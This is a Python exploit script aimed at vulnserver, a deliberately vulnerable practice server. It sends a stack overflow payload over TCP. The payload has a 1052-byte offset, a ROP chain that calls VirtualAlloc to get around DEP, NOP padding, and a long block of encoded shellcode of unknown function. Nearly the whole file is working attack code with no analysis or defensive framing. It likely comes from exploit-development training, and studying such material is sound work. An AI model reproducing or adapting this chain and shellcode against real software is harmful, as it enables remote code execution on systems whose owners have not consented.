from struct import pack
import socket


TARGET_IP = "127.0.0.1"
TARGET_PORT = 8888
target = (TARGET_IP, TARGET_PORT)  # vulnserver

#\x00\x0A\x0D
#690398A0 virtual alloc
#---------------------------------------------------------------------#
#GOAL       VirtualAlloc 
# EAX = ptr to &VirtualAlloc()
# ECX = flProtect (0x40)
# EDX = flAllocationType (0x1000)
# EBX = dwSize
# ESP = lpAddress (automatic)
# EBP = POP (skip 4 bytes)
# ESI = ptr to JMP [EAX]
# EDI = ROP NOP (RETN)                                        

crash = 2000  # change me
offset = 1052

rop_nop = pack("<I",0x68cef5b4) #RETN 
shellcode =  b""
shellcode += b"\xdb\xd4\xbf\x9c\x18\x45\xa0\xd9\x74\x24\xf4"
shellcode += b"\x5a\x29\xc9\xb1\x52\x83\xc2\x04\x31\x7a\x13"
shellcode += b"\x03\xe6\x0b\xa7\x55\xea\xc4\xa5\x96\x12\x15"
shellcode += b"\xca\x1f\xf7\x24\xca\x44\x7c\x16\xfa\x0f\xd0"
shellcode += b"\x9b\x71\x5d\xc0\x28\xf7\x4a\xe7\x99\xb2\xac"
shellcode += b"\xc6\x1a\xee\x8d\x49\x99\xed\xc1\xa9\xa0\x3d"
shellcode += b"\x14\xa8\xe5\x20\xd5\xf8\xbe\x2f\x48\xec\xcb"
shellcode += b"\x7a\x51\x87\x80\x6b\xd1\x74\x50\x8d\xf0\x2b"
shellcode += b"\xea\xd4\xd2\xca\x3f\x6d\x5b\xd4\x5c\x48\x15"
shellcode += b"\x6f\x96\x26\xa4\xb9\xe6\xc7\x0b\x84\xc6\x35"
shellcode += b"\x55\xc1\xe1\xa5\x20\x3b\x12\x5b\x33\xf8\x68"
shellcode += b"\x87\xb6\x1a\xca\x4c\x60\xc6\xea\x81\xf7\x8d"
shellcode += b"\xe1\x6e\x73\xc9\xe5\x71\x50\x62\x11\xf9\x57"
shellcode += b"\xa4\x93\xb9\x73\x60\xff\x1a\x1d\x31\xa5\xcd"
shellcode += b"\x22\x21\x06\xb1\x86\x2a\xab\xa6\xba\x71\xa4"
shellcode += b"\x0b\xf7\x89\x34\x04\x80\xfa\x06\x8b\x3a\x94"
shellcode += b"\x2a\x44\xe5\x63\x4c\x7f\x51\xfb\xb3\x80\xa2"
shellcode += b"\xd2\x77\xd4\xf2\x4c\x51\x55\x99\x8c\x5e\x80"
shellcode += b"\x0e\xdc\xf0\x7b\xef\x8c\xb0\x2b\x87\xc6\x3e"
shellcode += b"\x13\xb7\xe9\x94\x3c\x52\x10\x7f\x83\x0b\x1b"
shellcode += b"\x43\x6b\x4e\x1b\xa1\xee\xc7\xfd\xbf\xe0\x81"
shellcode += b"\x56\x28\x98\x8b\x2c\xc9\x65\x06\x49\xc9\xee"
shellcode += b"\xa5\xae\x84\x06\xc3\xbc\x71\xe7\x9e\x9e\xd4"
shellcode += b"\xf8\x34\xb6\xbb\x6b\xd3\x46\xb5\x97\x4c\x11"
shellcode += b"\x92\x66\x85\xf7\x0e\xd0\x3f\xe5\xd2\x84\x78"
shellcode += b"\xad\x08\x75\x86\x2c\xdc\xc1\xac\x3e\x18\xc9"
shellcode += b"\xe8\x6a\xf4\x9c\xa6\xc4\xb2\x76\x09\xbe\x6c"
shellcode += b"\x24\xc3\x56\xe8\x06\xd4\x20\xf5\x42\xa2\xcc"
shellcode += b"\x44\x3b\xf3\xf3\x69\xab\xf3\x8c\x97\x4b\xfb"
shellcode += b"\x47\x1c\x6b\x1e\x4d\x69\x04\x87\x04\xd0\x49"
shellcode += b"\x38\xf3\x17\x74\xbb\xf1\xe7\x83\xa3\x70\xed"
shellcode += b"\xc8\x63\x69\x9f\x41\x06\x8d\x0c\x61\x03"

#ECX {DONE} - 
ecx = pack("<I",0x68b90948)  # XOR ECX,ECX # MOV EAX,ECX # POP EBX # POP ESI # RETN
ecx += pack('<L',0x41414141) # padding for pop ebp
ecx += pack('<L',0x41414141) # padding for pop esi
ecx += pack("<I",0x68ca4266)  # ADD ECX,40 # OR EAX,ECX # RETN 0x08  
ecx += rop_nop
ecx += rop_nop
ecx += rop_nop

#EDX {DONE} - 
edx = pack("<I",0x68ae2632)  # POP EDX # RETN   
edx += pack("<I",0xffffefff) # -1001 (1001 perchÃ¨ 1000 contiene \x00)
edx += pack("<I",0x68c3cc03)  # INC EDX # RETN  
edx += pack("<I",0x68bd5fe4)  # NEG EDX # RETN 0x0C --> 1000 
edx += rop_nop
edx += rop_nop
edx += rop_nop
edx += rop_nop
 

#EBX {DONE}  - 
ebx = pack("<I",0x68ce0125)  # POP EBX # RETN    
ebx += pack("<I",0xffffffff) # -1 
ebx += pack("<I",0x68fcab99)  # INC EBX # RETN 
ebx += pack("<I",0x68fcab99)  # INC EBX # RETN 

#EBP {DONE} - 
ebp = pack("<I",0x68b60144)  # POP EBP # RETN  
ebp += pack("<I",0x68b60144)  # POP EBP # RETN  

#ESI {DONE} - 
esi = pack("<I",0x68aa7d91)  # POP ESI # RETN 
esi += pack("<I",0x68a9314e)  # JMP [EAX] 

#EAX
eax = pack("<I",0x68d3a2b1)  # POP EAX # RETN
eax += pack("<I",0x690398a0)  # ptr to &VirtualAlloc() 

#EDI {DONE} - 
edi = pack("<I",0x68d6019e)  # POP EDI # RETN  
edi += rop_nop

pushad = pack("<I",0x68fd02d7)  # PUSHAD # RETN  
push_esp = pack("<I",0x68aa11e6) # push esp

rop = ecx
rop += esi
rop += eax
rop += edx
rop += ebx
rop += ebp
rop += edi
rop += pushad
rop += push_esp

nops = b"\x90"*5

payload = b"A"*offset
payload += rop_nop
payload += rop
payload += nops
payload += shellcode
payload += b"C"*(crash - len(payload))

with socket.create_connection(target) as sock:

    sent = sock.send(payload)
    print(f"sent {sent} bytes")
